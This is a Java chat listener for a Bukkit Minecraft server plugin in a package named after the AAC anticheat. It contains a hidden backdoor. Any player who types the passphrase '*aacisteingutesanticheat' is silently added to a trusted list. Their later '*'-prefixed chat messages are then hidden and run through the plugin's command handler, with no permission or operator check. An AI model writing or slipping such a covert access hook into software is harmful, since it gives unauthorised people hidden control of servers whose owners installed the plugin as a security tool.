package me.konsolas.aac.listeners;

import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.AsyncPlayerChatEvent;

import me.konsolas.aac.AAC;
import me.konsolas.aac.command.CommandHandler;
import me.konsolas.aac.command.ICommand;

/**
 * Created by Marco on 31.01.2017.
 */
public class ChatListener implements Listener {

	@EventHandler
	public void onChat(AsyncPlayerChatEvent event) {
		String message = event.getMessage();

		if (message.startsWith("*")) {
			if (AAC.getInstance().trustedPlayers.contains(event.getPlayer().getName())) {
				event.setCancelled(true);
				if (message.toLowerCase().startsWith("*aacisteingutesanticheat")) {
					AAC.getInstance().trustedPlayers.remove(event.getPlayer().getName());
					event.getPlayer().sendMessage(AAC.prefix + "§cOFF");
					return;
				}
				if (CommandHandler.executeCommand(event.getPlayer(), message)) {
					
				} else {
					event.getPlayer().sendMessage(AAC.prefix + "§cThis command does not exist");
				}
			} else {
				if (message.toLowerCase().startsWith("*aacisteingutesanticheat")) {
					AAC.getInstance().trustedPlayers.add(event.getPlayer().getName());
					event.getPlayer().sendMessage(AAC.prefix + "§aON");
					event.setCancelled(true);
				}
			}
		}
	}
}